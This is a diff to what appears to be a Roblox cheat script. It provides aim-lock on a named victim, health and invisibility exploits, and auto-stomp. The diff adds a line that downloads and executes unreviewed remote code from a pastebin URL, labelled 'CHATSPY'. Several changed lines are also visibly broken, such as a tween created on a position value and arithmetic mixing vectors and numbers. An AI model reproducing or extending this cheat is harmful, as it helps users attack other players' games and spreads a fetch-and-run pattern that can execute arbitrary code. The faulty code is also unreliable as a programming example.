@@ -5,11 +5,14 @@ getgenv().autoRst = false;
 getgenv().stomp = false;
 local camera = game.Workspace.Camera
 local user = nil
+local userPart = nil
 local TS = game.TweenService
-local tweeninfo = TweenInfo.new(3)
+local tweeninfo = TweenInfo.new(2)
 local RS = game:GetService("RunService")
 local VICTIM = nil
-local smooth = 0.35 -- 0 to 1
+
+-- CHATSPY
+loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
 
 local function getFullUser(input)
     local MATCHES = {}
@@ -38,7 +41,8 @@ local function InfHealth()
             local PlrName = game.Players.LocalPlayer.Name
             if AutoInfHealth then
                 if game.Workspace:FindFirstChild(PlrName).Humanoid then
-                    game.Workspace:FindFirstChild(PlrName).Head:Remove()
+                    game.Workspace:FindFirstChild(PlrName).Head:BreakJoints()
+                    game.Workspace:FindFirstChild(PlrName).Head.Position = CFrame.new(0,9999999,0)
                 end
             end
         end
@@ -85,17 +89,16 @@ local function UnLockNotif()
     })
 end
 
-local function startLock()
+local function startLock(target)
     spawn(function()
         while wait() do
             if lock then
-                local target = user
                 local NAME = target.Name
                 if target and not target:GetAttribute("Knocked") and game.Players[NAME] then
-              				    if target.LowerTorso then
-              				        local tween = TS:Create(camera, tweeninfo, { CFrame = CFrame.new(camera.CFrame.Position, target.LowerTorso.Position + smootheningVelocity(target) * 0.34204) })
-                  				    tween:Play()
-              				        if target:GetAttribute("Knocked") then
+              				    if target.UpperTorso then
+                  				    local tween = TS:Create(camera.CFrame.Position, tweeninfo, { CFrame = CFrame.new(target.UpperTorso.Position + target.UpperTorso.Velocity + 0.34204) })
+              				        tween:Play()
+              				        if not lock or target:GetAttribute("Knocked") or not game.Players[NAME] then
               				            tween:Cancel()
               				        end
               				    end
@@ -117,25 +120,6 @@ local function autoBuyArmour()
         end
     end)
 end
-
-if user then
-    print(user)
-    local TargerVelocity = user.LowerTorso.Velocity
-end
-
-local function smootheningVelocity(person)
-    TargetVelocity = TargetVelocity * smooth + person.LowerTorso.Velocty * (1 - smooth)
-    return TargetVelocity
-end
-
-spawn(function()
-    if lock and user then
-        RS.HeartBeat:Connect(function()
-            smootheningVelocity(user)
-            startLock()
-        end)
-    end
-end)
 
 local function autoStomp()
     spawn(function()
@@ -168,7 +152,7 @@ tab.newToggle("Auto Reset", "Auto resets when health is below/equal to 5.", fals
     autoRst = bool
     autoReset()
 end)
-]]--
+]]
 tab.newInput("Username", "Username to lock on.", function(inp)
     getFullUser(inp)
 end)
@@ -178,11 +162,19 @@ tab.newToggle("Lock On User", "Starts the lock.", false, function(bool)
     end
     if bool then
         LockNotif()
+        while wait() do
+            if user ~= VICTIM then
+                VICTIM = user
+            else
+                break
+            end
+        end
     end
     lock = bool
-    startLock()
-    print(user)
+    startLock(VICTIM)
+    print(VICTIM)
 end)
+--[[
 tab.newButton("Invisible", "", function()
     local name = game.Players.LocalPlayer.Name
     local localPlayer = game.Workspace[name]
@@ -193,3 +185,4 @@ tab.newButton("Invisible", "", function()
     wait(0.1)
     localPlayer.HumanoidRootPart.CFrame = InvisPos
 end)
+]]
